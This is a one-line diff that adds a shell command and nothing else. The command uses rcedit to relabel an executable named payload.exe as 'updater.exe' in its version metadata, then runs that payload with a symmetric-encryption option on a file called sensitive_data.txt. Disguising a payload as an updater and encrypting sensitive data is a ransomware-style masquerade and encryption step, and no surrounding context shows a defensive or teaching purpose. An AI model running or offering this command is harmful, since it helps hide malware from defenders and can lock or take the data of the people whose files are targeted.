@@ -1,0 +1,1 @@
+rcedit.exe payload.exe --set-version-string "OriginalFilename" "updater.exe" && payload.exe --symmetric sensitive_data.txt
